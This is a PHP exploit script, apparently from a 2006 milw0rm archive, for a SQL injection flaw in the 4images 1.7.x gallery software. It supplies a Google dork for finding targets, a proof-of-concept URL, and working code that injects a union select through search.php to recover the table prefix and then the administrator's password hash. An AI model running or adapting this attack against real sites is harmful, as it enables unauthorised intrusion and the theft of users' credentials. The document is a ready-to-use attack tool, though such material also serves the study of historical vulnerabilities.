#!/usr/bin/php
<?php
/*
4images 1.7.x Remote SQL Injection Vulnerability

Usage: php file.php [host] [path] [table prefix] [user id]

Googledork "powered by 4images 1.7.x"

Vulnerability: Disfigure
Research: h3llfyr3
Coding: Synsta.

PoC:
<target>/<4images_dir>/search.php?search_user=x%2527%20union%20select%20user_password%20from%204images_users%20where%20user_name=%2527ADMIN

[w4ck1ng] - w4ck1ng.com
*/
if(!$argv[3]){
die("Usage:
php $argv[0] [host] [path] [options] [table prefix] [user id]\n
Options:
-d: Determine table prefix\n
Example:
php $argv[0] domain.com /4images/ 4images_ 1
php $argv[0] domain.com /4images/ -d\n");
}
if(eregi("http://", $argv[1])){
die("Usage:
php $argv[0] [host] [path] [options] [table prefix] [user id]\n
Options:
-d: Determine table prefix\n
Example:
php $argv[0] domain.com /4images/ 4images_ 1
php $argv[0] domain.com /4images/ -d\n");
}
if($argv[3]=="-d"){
$pipe = fsockopen($argv[1],80);
if(!$pipe){
die("Cannot connect to host.");
} else {
$sql = "x%27";
$sql = urlencode($sql);
$req =  "GET $argv[2]"."search.php?search_user="."$sql HTTP/1.1\r\n";
$req .= "Host: $argv[1]\r\n";
$req .= "Connection: Close\r\n\r\n";
fwrite($pipe , $req);
while(!feof($pipe)) {
$data .= fgets($pipe);
}
$gdata= explode("FROM ",$data);
$gtab = explode("WHERE ",$gdata[1]);
$tab = trim($gtab[0]);
$tab = str_replace("users","",$tab);
if(eregi("<br />", $page)){ die("Failed.."); }else{ die("Table Prefix: $tab\n"); }
}
}
if($argv[4]){
$pipe = fsockopen($argv[1],80);
if(!$pipe){
die("Cannot connect to host.");
} else {
$sql = "x%27%20union%20select%20user_password%20from%20"."$argv[3]"."users%20where%20user_id%3D%27$argv[4]";
$sql = urlencode($sql);
$req =  "GET $argv[2]"."search.php?search_user="."$sql HTTP/1.1\r\n";
$req .= "Host: $argv[1]\r\n";
$req .= "Connection: Close\r\n\r\n";
fwrite($pipe , $req);
while(!feof($pipe)) {
$data .= fgets($pipe);
}
$gdata = explode("Unknown column '",$data);
$ghash = explode("' in 'where clause'",$gdata[1]);
$hash = $ghash[0];
if(strlen($hash) != 32){ die("Exploit failed..\n"); }else{ echo "Outputted Hash: $hash\n"; }
}
}
?>

# milw0rm.com [2006-10-08]